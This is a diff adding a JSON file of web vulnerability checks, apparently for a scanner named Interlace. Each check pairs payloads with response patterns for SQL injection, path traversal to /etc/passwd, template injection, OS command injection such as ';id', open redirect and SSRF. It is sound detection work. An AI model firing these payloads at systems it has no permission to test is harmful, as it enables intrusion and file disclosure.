@@ -1,0 +1,94 @@
+[
+  {
+    "id": "sqli-error",
+    "name": "SQL Injection (error-based)",
+    "severity": "high",
+    "type": "grep",
+    "payloads": ["'", "\"", "')", "' OR '1'='1", "1' ORDER BY 99-- -"],
+    "grep": [
+      "SQL syntax.*MySQL",
+      "Warning.*mysqli?",
+      "valid MySQL result",
+      "PostgreSQL.*ERROR",
+      "pg_query\\(\\)",
+      "ORA-[0-9]{5}",
+      "quoted string not properly terminated",
+      "SQLite3?::",
+      "unrecognized token:",
+      "SQLSTATE\\[",
+      "Microsoft OLE DB Provider for SQL Server",
+      "Unclosed quotation mark after the character string"
+    ],
+    "detail": "A database error was triggered by injecting SQL metacharacters, indicating the parameter is concatenated into a SQL query."
+  },
+  {
+    "id": "sqli-time",
+    "name": "SQL Injection (time-based blind)",
+    "severity": "high",
+    "type": "time",
+    "payloads": ["' OR SLEEP(5)-- -", "'; WAITFOR DELAY '0:0:5'--", "\" OR SLEEP(5)-- -", "' OR pg_sleep(5)-- -", "1) OR SLEEP(5)-- -"],
+    "detail": "Injecting a database sleep caused the response to be delayed by ~5 seconds, indicating blind SQL injection."
+  },
+  {
+    "id": "sqli-boolean",
+    "name": "SQL Injection (boolean-based blind)",
+    "severity": "high",
+    "type": "boolean",
+    "payloads": ["' AND 1=1-- -", "' AND 1=2-- -"],
+    "detail": "A true vs false SQL condition produced different responses, indicating boolean-based blind SQL injection."
+  },
+  {
+    "id": "path-traversal",
+    "name": "Path Traversal",
+    "severity": "high",
+    "type": "grep",
+    "payloads": [
+      "../../../../../../etc/passwd",
+      "....//....//....//....//etc/passwd",
+      "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
+      "/etc/passwd"
+    ],
+    "grep": ["root:.*:0:0:", "\\[boot loader\\]", "; for 16-bit app support"],
+    "detail": "The response contained the contents of a system file, indicating the parameter is used to build a file path without sanitization."
+  },
+  {
+    "id": "ssti",
+    "name": "Server-Side Template Injection",
+    "severity": "high",
+    "type": "grep",
+    "payloads": ["{{1338*1337}}", "${1338*1337}", "#{1338*1337}", "{{1338*1337}}<%=1338*1337%>"],
+    "grep": ["1788906"],
+    "detail": "A template expression (1338*1337) was evaluated by the server to 1788906, indicating server-side template injection."
+  },
+  {
+    "id": "cmdi",
+    "name": "OS Command Injection",
+    "severity": "high",
+    "type": "grep",
+    "payloads": [";id", "|id", "& id", "`id`", "$(id)", "; echo ilx-$((13*13))"],
+    "grep": ["uid=[0-9]+\\([a-z]", "ilx-169"],
+    "detail": "Output of an injected OS command (id / arithmetic echo) appeared in the response, indicating command injection."
+  },
+  {
+    "id": "reflected-xss",
+    "name": "Reflected Cross-Site Scripting",
+    "severity": "high",
+    "type": "reflection",
+    "detail": "An injected HTML/script payload was reflected in the response without encoding, allowing cross-site scripting."
+  },
+  {
+    "id": "open-redirect",
+    "name": "Open Redirect",
+    "severity": "medium",
+    "type": "redirect",
+    "payloads": ["https://interlace-oob.example/", "//interlace-oob.example/"],
+    "detail": "The parameter controls a redirect target and accepted an external URL, allowing an open redirect."
+  },
+  {
+    "id": "blind-ssrf",
+    "name": "Blind SSRF / External Service Interaction",
+    "severity": "high",
+    "type": "oob",
+    "detail": "The server made an out-of-band request to Interlace's tracking URL after the parameter was set to it, indicating server-side request forgery or external service interaction."
+  }
+]
